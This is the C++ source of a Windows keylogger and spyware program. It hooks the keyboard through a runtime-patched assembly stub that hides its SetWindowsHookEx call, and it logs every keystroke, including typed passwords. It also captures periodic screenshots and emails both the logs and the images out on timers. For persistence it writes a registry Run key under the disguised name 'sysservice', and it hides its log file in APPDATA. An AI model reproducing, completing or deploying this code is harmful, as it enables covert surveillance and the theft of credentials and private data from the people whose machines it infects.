#include <iostream>
#include <string>
#include <Windows.h>
#include <ctime>

#include <vector>
#include <fstream>
#include <numeric>
#include <thread>
#include <future>
#include <tchar.h>

#include "main.h"
#include "sendemail.h"
#include "screenshot.h"
#include "base64.h"


std::string vector2string(std::vector<std::string> vec);

int main() {
    perform_SetWindowsHookEx();

    auto logsFuture = std::async(sendLogsAsyncManager);
    auto screenshotFuture = std::async(sendScreenshotAsyncManager);

    buffer.reserve(MAX_BUFFER_SIZE);

    if (startWithOs)
        start_with_os();

    if (hideLogs)
        getAppDataPath();

    if (restoreOldLogs)
        restoreAndSendOldLogs(logPath);

    MSG msg;
    while (!GetMessage(&msg, nullptr, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

void sendLogsAsyncManager() {
    int timerCounter = 0;
    for (;;) {
        auto start = std::chrono::high_resolution_clock::now();
        for (timerCounter; timerCounter < TIMER_INTERVAL; ++timerCounter) {
            std::this_thread::sleep_until(start + (timerCounter + 1) * std::chrono::seconds(1));
            OutputDebugStringW(L"2");
        }
        timerCounter = 0;

        sendemailThread(vector2string(buffer));
        buffer.clear();
    }
}

void sendScreenshotAsyncManager() {
    int timerCounter = 0;
    for (;;) {
        auto start = std::chrono::high_resolution_clock::now();
        for (timerCounter; timerCounter < SCREENSHOT_TIMER_INTERVAL; ++timerCounter) {
            std::this_thread::sleep_until(start + (timerCounter + 1) * std::chrono::seconds(1));
            std::cout << SCREENSHOT_TIMER_INTERVAL - timerCounter;
        }
        timerCounter = 0;

        CapScreen2Bmp();
        std::string bytes2encode(
                reinterpret_cast<char*>(screenshotData.data()),
                screenshotData.size());

        std::string encoding;
        Base64::Encode(bytes2encode, &encoding);

        sendemailThread_attach(&encoding);
    }
}


void perform_SetWindowsHookEx() {
    const char *user32 = "User32.dll";
    const char *SetwindowshookEx = "SetWindowsHookExA";

    auto LoadLibrarY = (unsigned long)GetProcAddress(
            LoadLibrary(_T("kernel32.dll")), "LoadLibraryA");
    auto GetProc = (unsigned long)GetProcAddress(
            LoadLibrary(_T("kernel32.dll")), "GetProcAddress");

    auto myhandle = (unsigned long)GetModuleHandle(0);
    DWORD oldP = 0;
    void *offset_func = LowLevelKeyboardProc;

    if (VirtualProtect(patched_SetWindowsHookEx,
                       (DWORD)size - (DWORD)patched_SetWindowsHookEx,
                       PAGE_EXECUTE_READWRITE, &oldP) == 0) {

        MessageBox(0, _T("Error"), _T("VirtualProtect()"), MB_OK);
        return;
    }

    memcpy((void*)((unsigned long)patched_SetWindowsHookEx + 3), &user32, 4);
    memcpy((void*)((unsigned long)patched_SetWindowsHookEx + 8), &LoadLibrarY, 4);
    memcpy((void*)((unsigned long)patched_SetWindowsHookEx + 15), &SetwindowshookEx, 4);
    memcpy((void*)((unsigned long)patched_SetWindowsHookEx + 21), &GetProc, 4);
    memcpy((void*)((unsigned long)patched_SetWindowsHookEx + 30), &myhandle, 4);
    memcpy((void*)((unsigned long)patched_SetWindowsHookEx + 35), &offset_func, 4);

    Sleep(100);
    patched_SetWindowsHookEx();
}


bool specialKeyIsPressed = false;
unsigned char lastPressedKey = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(
        int nCode,
        WPARAM wParam,
        LPARAM lParam
) {
    bool shift = false;

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *stroke = (KBDLLHOOKSTRUCT*)(lParam);
        unsigned char pressedKey = stroke->vkCode;

        if (wParam == WM_KEYUP) {
            specialKeyIsPressed = false;
        }

        if (wParam == WM_KEYDOWN) {
            shift = true ? GetAsyncKeyState(VK_SHIFT) : false;

            if (lastPressedKey != pressedKey) {
                specialKeyIsPressed = false;
            }

            // Special keys
            if (!specialKeyIsPressed) {
                specialKeyIsPressed = true;
                switch (pressedKey) {
                    case VK_BACK:
                        LogKey("<BACKSPACE>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_RETURN:
                        LogKey("<ENTER>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_LEFT:
                        LogKey("<LEFT>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_RIGHT:
                        LogKey("<RIGHT>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_CAPITAL:
                        LogKey("<C_LOCK>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_UP:
                        LogKey("<UP>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_DOWN:
                        LogKey("<DOWN>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_RSHIFT:
                        LogKey("<R_SHIFT>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_LSHIFT:
                        LogKey("<L_SHIFT>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_TAB:
                        LogKey("<TAB>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_ESCAPE:
                        LogKey("<ESC>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_LWIN:
                        LogKey("<L_WIN>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_RWIN:
                        LogKey("<R_WIN>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_LCONTROL:
                        LogKey("<L_CTRL>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_DELETE:
                        LogKey("<DELETE>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_INSERT:
                        LogKey("<INSERT>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_HOME:
                        LogKey("<HOME>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_END:
                        LogKey("<END>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_SNAPSHOT:
                        LogKey("<PRNT_SCR>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_PRIOR:
                        LogKey("<PAGE_UP>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_NEXT:
                        LogKey("<PAGE_DOWN>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F1:
                        LogKey("<F1>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F2:
                        LogKey("<F2>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F3:
                        LogKey("<F3>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F4:
                        LogKey("<F4>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F5:
                        LogKey("<F5>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F6:
                        LogKey("<F6>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F7:
                        LogKey("<F7>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F8:
                        LogKey("<F8>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F9:
                        LogKey("<F9>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F10:
                        LogKey("<F10>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F11:
                        LogKey("<F11>");
                        lastPressedKey = pressedKey;
                        break;
                    case VK_F12:
                        LogKey("<F12>");
                        lastPressedKey = pressedKey;
                        break;
                    default:
                        break;
                }
            }

            if (!shift) {
                switch (pressedKey) {
                    case 0x30: LogKey("0"); break;
                    case 0x31: LogKey("1"); break;
                    case 0x32: LogKey("2"); break;
                    case 0x33: LogKey("3"); break;
                    case 0x34: LogKey("4"); break;
                    case 0x35: LogKey("5"); break;
                    case 0x36: LogKey("6"); break;
                    case 0x37: LogKey("7"); break;
                    case 0x38: LogKey("8"); break;
                    case 0x39: LogKey("9"); break;

                    case VK_NUMPAD0:
                        LogKey("<NUM_0>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD1:
                        LogKey("<NUM_1>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD2:
                        LogKey("<NUM_2>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD3:
                        LogKey("<NUM_3>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD4:
                        LogKey("<NUM_4>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD5:
                        LogKey("<NUM_5>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD6:
                        LogKey("<NUM_6>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD7:
                        LogKey("<NUM_7>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD8:
                        LogKey("<NUM_8>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_NUMPAD9:
                        LogKey("<NUM_9>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_MULTIPLY:
                        LogKey("<NUM_*>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_ADD:
                        LogKey("<NUM_+>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_SUBTRACT:
                        LogKey("<NUM_->");
                        specialKeyIsPressed = true;
                        break;
                    case VK_DIVIDE:
                        LogKey("<NUM_/>");
                        specialKeyIsPressed = true;
                        break;
                    case VK_DECIMAL:
                        LogKey("<NUM_.>");
                        specialKeyIsPressed = true;
                        break;

                    case 0x41: LogKey("a"); break;
                    case 0x42: LogKey("b"); break;
                    case 0x43: LogKey("c"); break;
                    case 0x44: LogKey("d"); break;
                    case 0x45: LogKey("e"); break;
                    case 0x46: LogKey("f"); break;
                    case 0x47: LogKey("g"); break;
                    case 0x48: LogKey("h"); break;
                    case 0x49: LogKey("i"); break;
                    case 0x4a: LogKey("j"); break;
                    case 0x4b: LogKey("k"); break;
                    case 0x4c: LogKey("l"); break;
                    case 0x4d: LogKey("m"); break;
                    case 0x4e: LogKey("n"); break;
                    case 0x4f: LogKey("o"); break;
                    case 0x50: LogKey("p"); break;
                    case 0x51: LogKey("q"); break;
                    case 0x52: LogKey("r"); break;
                    case 0x53: LogKey("s"); break;
                    case 0x54: LogKey("t"); break;
                    case 0x55: LogKey("u"); break;
                    case 0x56: LogKey("v"); break;
                    case 0x57: LogKey("w"); break;
                    case 0x58: LogKey("x"); break;
                    case 0x59: LogKey("y"); break;
                    case 0x5a: LogKey("z"); break;

                    case 0xC0: LogKey("`"); break;
                    case 0xBd: LogKey("-"); break;
                    case 0xBb: LogKey("="); break;
                    case 0xDb: LogKey("["); break;
                    case 0xDd: LogKey("]"); break;
                    case 0xBa: LogKey(";"); break;
                    case 0xDe: LogKey("'"); break;
                    case 0xDc: LogKey("\\"); break;
                    case 0xBC: LogKey(","); break;
                    case 0xBe: LogKey("."); break;
                    case 0xBf: LogKey("/"); break;


                    case VK_SPACE: LogKey("<SPACE>"); break;
                    default:
                        break;
                }
            }
            else {
                switch (pressedKey) {
                    case 0x30: LogKey(")"); break;
                    case 0x31: LogKey("!"); break;
                    case 0x32: LogKey("@"); break;
                    case 0x33: LogKey("#"); break;
                    case 0x34: LogKey("$"); break;
                    case 0x35: LogKey("%"); break;
                    case 0x36: LogKey("^"); break;
                    case 0x37: LogKey("&"); break;
                    case 0x38: LogKey("*"); break;
                    case 0x39: LogKey("("); break;

                    case 0x41: LogKey("A"); break;
                    case 0x42: LogKey("B"); break;
                    case 0x43: LogKey("C"); break;
                    case 0x44: LogKey("D"); break;
                    case 0x45: LogKey("E"); break;
                    case 0x46: LogKey("F"); break;
                    case 0x47: LogKey("G"); break;
                    case 0x48: LogKey("H"); break;
                    case 0x49: LogKey("I"); break;
                    case 0x4a: LogKey("J"); break;
                    case 0x4b: LogKey("K"); break;
                    case 0x4c: LogKey("L"); break;
                    case 0x4d: LogKey("M"); break;
                    case 0x4e: LogKey("N"); break;
                    case 0x4f: LogKey("O"); break;
                    case 0x50: LogKey("P"); break;
                    case 0x51: LogKey("Q"); break;
                    case 0x52: LogKey("R"); break;
                    case 0x53: LogKey("S"); break;
                    case 0x54: LogKey("T"); break;
                    case 0x55: LogKey("U"); break;
                    case 0x56: LogKey("V"); break;
                    case 0x57: LogKey("W"); break;
                    case 0x58: LogKey("X"); break;
                    case 0x59: LogKey("Y"); break;
                    case 0x5a: LogKey("Z"); break;

                    case 0xC0: LogKey("~"); break;
                    case 0xBd: LogKey("_"); break;
                    case 0xBb: LogKey("+"); break;
                    case 0xDb: LogKey("{"); break;
                    case 0xDd: LogKey("}"); break;
                    case 0xBa: LogKey(":"); break;
                    case 0xDe: LogKey("\""); break;
                    case 0xDc: LogKey("|"); break;
                    case 0xBf: LogKey("?"); break;
                    case 0xBc: LogKey("<"); break;
                    case 0xBe: LogKey(">"); break;

                    case VK_SPACE: LogKey("<SPACE>"); break;
                    default:
                        break;
                }
            }
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

std::string vector2string(std::vector<std::string> vec) {
    return std::accumulate(vec.begin(), vec.end(), std::string(),
                           [](const std::string& a, const std::string& b) -> std::string {
                               return a + (a.length() > 0 ? "" : "") + b;
                           }) + "\n";
}

void LogKey(const std::string& keyAlias) {
    buffer.push_back(keyAlias);
    std::cout << keyAlias;

    if (buffer.size() >= MAX_BUFFER_SIZE) {
        sendemailThread(vector2string(buffer));
        buffer.clear();
    }

    std::fstream logFile;
    logFile.open(logPath, std::ios::app);
    if (logFile) {
        logFile << keyAlias;
    }
}

int start_with_os() {
    long result = 0;
    HKEY hkey = nullptr;

    result = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                          0, KEY_READ | KEY_WRITE | KEY_QUERY_VALUE, &hkey);
    if (result != ERROR_SUCCESS) return 1;

    char* cpath = new char[MAX_PATH + 1];
    GetModuleFileNameA(nullptr, cpath, MAX_PATH);

    auto path = char2wchar_t(cpath);
    std::wstring strRegValue;

    GetStringRegKey(hkey, L"sysservice", strRegValue, L"");

    if (strRegValue == path) {
        return 1;
    }

    result = RegSetValueEx(hkey,  _T("sysservice"), 0, REG_SZ,
                           (BYTE*)cpath, _tcslen(cpath) * sizeof(TCHAR));
    if (result != ERROR_SUCCESS) return 1;

    RegCloseKey(hkey);
    return 0;
}

LONG GetStringRegKey(
        HKEY hKey,
        const std::wstring& strValueName,
        std::wstring& strValue,
        const std::wstring& strDefaultValue
) {

    strValue = strDefaultValue;
    WCHAR szBuffer[BUFSIZ];
    DWORD dwBufferSize = sizeof szBuffer;
    ULONG nError;

    nError = RegQueryValueExW(hKey,
                              strValueName.c_str(),
                              nullptr, nullptr,
                              (LPBYTE)szBuffer,
                              &dwBufferSize
    );

    if (ERROR_SUCCESS == nError) {
        strValue = szBuffer;
    }

    return nError;
}

int restoreAndSendOldLogs(std::string& filePath) {
    std::ifstream file(filePath);
    std::string c_buf;

    if (file.is_open() &&
        file.peek() != std::ifstream::traits_type::eof()) {

        while (file.good()) {
            file >> c_buf;
            buffer.push_back(c_buf);
        }
    }
    else {
        return 1;
    }

    if (!file.eof() && file.fail())
        return 1;

    sendemailThread(vector2string(buffer));
    file.close();

    std::remove(filePath.c_str());
    buffer.clear();

    return EXIT_SUCCESS;
}

int getAppDataPath() {
    char *pValue = nullptr; size_t len = 0;
    auto err = _dupenv_s(&pValue, &len, "APPDATA");

    if (err) {
        return 1;
    }

    std::string path;
    path.append(pValue);
    path.append("\\");
    path.append(logPath);

    logPath = path;

    return 0;
}


wchar_t* char2wchar_t(char *in) {
    size_t size = strlen(in) + 1;
    auto *base64W = new wchar_t[size];

    size_t outSize;
    mbstowcs_s(&outSize, base64W, size, in, size - 1);

    return base64W;
}


static __declspec(naked) void patched_SetWindowsHookEx() {
    _asm {
            pushfd
            pushad
            push 0xACEACEAC
            mov ecx, 0xACEACEAC
            call ecx

            push 0xACEACEAC
            push eax
            mov ebx, 0xACEACEAC
            call ebx

            push 0
            push 0xACEACEAC
            push 0xACEACEAC
            push 0Dh
            call eax

            mov dword ptr[hhkLowLevelKybd], eax
            popad
            popfd
            ret
    }
}

static _declspec(naked) void size() {

}